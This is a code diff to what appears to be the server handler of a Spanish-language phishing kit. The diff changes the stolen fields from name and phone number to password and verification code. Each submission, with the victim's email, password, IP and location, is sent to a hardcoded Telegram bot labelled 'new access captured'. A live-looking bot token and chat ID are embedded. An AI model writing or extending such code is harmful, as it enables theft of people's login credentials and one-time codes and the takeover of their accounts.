@@ -1,7 +1,7 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
-  const { correo, nombre, lada, numero, fase } = req.body;
+  const { correo, password, metodo, codigo, fase } = req.body;
   const botToken = '8867160829:AAEL8B9X5tYSyMamfT9TLfM694-DpL4ST80';
   const chatId = '8655081226';
 
@@ -17,9 +17,9 @@ export default async function handler(req, res) {
 
   let texto;
   if (fase === '1') {
-    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
+    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 password: ${password}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
   } else {
-    texto = `📞 lada: ${lada}\n🔢 numero: ${numero}`;
+    texto = `📞 metodo: ${metodo}\n🔢 codigo: ${codigo}`;
   }
 
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
